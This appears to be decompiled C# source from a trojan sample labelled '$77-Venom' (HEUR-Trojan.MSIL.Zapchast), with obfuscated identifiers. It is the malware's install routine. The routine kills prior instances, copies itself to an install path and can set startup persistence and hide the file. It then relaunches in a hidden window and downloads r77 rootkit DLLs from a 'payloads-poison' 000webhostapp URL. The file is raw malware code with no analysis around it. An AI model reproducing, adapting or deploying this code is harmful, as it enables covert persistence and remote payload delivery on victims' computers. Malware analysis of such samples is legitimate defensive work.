// Decompiled with JetBrains decompiler
// Type: 뾄ꨚ飧後筕ᄏ౨罕昭ሡༀ秗퇸釔䏞螛澆苬볾嚷
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

public static class 뾄ꨚ飧後筕ᄏ౨罕昭ሡༀ秗퇸釔䏞螛澆苬볾嚷
{
  public static void 䛥뮧㛓뼛ụꈭ獹\u240F絁\uF500춘\u243Bᜒ撷덕颿矁\uFFFD\u283E퐍(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    bool flag = false;
    if (!Directory.Exists(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030)))
    {
      try
      {
        Directory.CreateDirectory(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030));
      }
      catch (Exception ex)
      {
        return;
      }
    }
    if (File.Exists(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath))
    {
      try
      {
        File.Delete(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath);
      }
      catch (Exception ex)
      {
        if (!(ex is IOException))
        {
          if (!(ex is UnauthorizedAccessException))
            goto label_12;
        }
        Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath));
        int id = Process.GetCurrentProcess().Id;
        foreach (Process process in processesByName)
        {
          if (process.Id != id)
          {
            process.Kill();
            flag = true;
          }
        }
      }
    }
label_12:
    if (flag)
      Thread.Sleep(5000);
    try
    {
      File.Copy(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.CurrentPath, 熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath, true);
    }
    catch (Exception ex)
    {
      return;
    }
    if (윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.\u257D\uEDCA玭訡턤诵؀쏡빘䡧ᙏ\uF8EA郢ⅈ眼戺崛潏ꠇ㮊 && !ᖐꋬ\uFFFD䄩遪푻\uFFFD떙\uEEAF鮝餰䏒삭ᰗ\u2257嬧擕步\uE657晢.쌕\uF3F0\u2AF9ᱺ帢쇉锉諩䍷\uF3D6ᚌ跺季\uFFFD싌ᎇ\uF663铞Ĝ\u08CA())
      熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.AddToStartupFailed = true;
    if (윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.獌剭\uE8BA覯\u0871\u235Aℰᗄ喙맚峐蛬牶甤部ं퍬יּ\uE4A5ꅪ)
    {
      try
      {
        File.SetAttributes(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath, FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
      }
    }
    环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.覹廕摈퍠㔀謌삋ⅳﱗ즫\uECBB搸\uE3AEച\uEC8D墑翷ﵛള嚶(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath);
    ProcessStartInfo startInfo = new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = 熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath
    };
    try
    {
      Process.Start(startInfo);
    }
    catch (Exception ex)
    {
    }
    if (File.Exists(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath))
    {
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uE693䡭\u228C攩ك\uE861쯟멹\u29D5Ẳ媲䒮߆剺溂鯐㒦旧稄齊();
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\u21CCᾢ禲蘴ဂᛦ絢\uE875舋\u31DF嵒\u33CA祔쫇먖ᦽ\uF1FE\uEA5C\uEF20臚();
      嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.锄笌᧒ɿ둛鈊\uFFFD꧶\u2AD8캭齙쿤ᦄ\u29D8뫀邇䂹ﮕ훥뿓();
      if (嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.웱\uE410连\uE581ᑓ鄁壠\uF860恌ᖖ탡\uE5A5\uFFFD擴몺ۂ짡ឮ\uEF9D諧())
      {
        if (File.Exists(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath))
        {
          try
          {
            嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.㳽㕶ꮄ\u300E䍂หꋗ័攐鄲蚨\u2434䖓㺌ᾖ祹ꙩ䈲ⴖ閗(true);
            嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.㳽㕶ꮄ\u300E䍂หꋗ័攐鄲蚨\u2434䖓㺌ᾖ祹ꙩ䈲ⴖ閗(false);
          }
          catch (Exception ex)
          {
          }
        }
      }
      else
      {
        string link = "https://payloads-poison.000webhostapp.com/r77-x86.dll";
        string name1 = "r77-x64.dll";
        string name2 = "r77-x86.dll";
        픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.쿟귆\u2F8E\uF1A8湣哸ӂ\uFFFD뫠怩젌拶馸ᢣ磦킢\u28C5氺鐺徺("https://payloads-poison.000webhostapp.com/r77-x64.dll", name1);
        Thread.Sleep(10000);
        픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.쿟귆\u2F8E\uF1A8湣哸ӂ\uFFFD뫠怩젌拶馸ᢣ磦킢\u28C5氺鐺徺(link, name2);
        Thread.Sleep(10000);
        픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.㪚蛐\uEDF1瑯鹅\uF22D郹鯹陱\u223D골繆퓠굚沪봸\u2685Ꙝ\uE301汁();
        픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.屽료\uE67E\uE7F2駙烮㞭㽷㫨ݙ晨羋뽃\uFBC7ꥲ앰쥯\uEE84歨䨃();
      }
    }
    if (!File.Exists(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath))
      return;
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.쟣\u286A㭵阁学\uE64A嶺\uF1C9澖끓胁\u31C8\uA875ꄒꩪ谿펇㥇挮픗();
  }
}
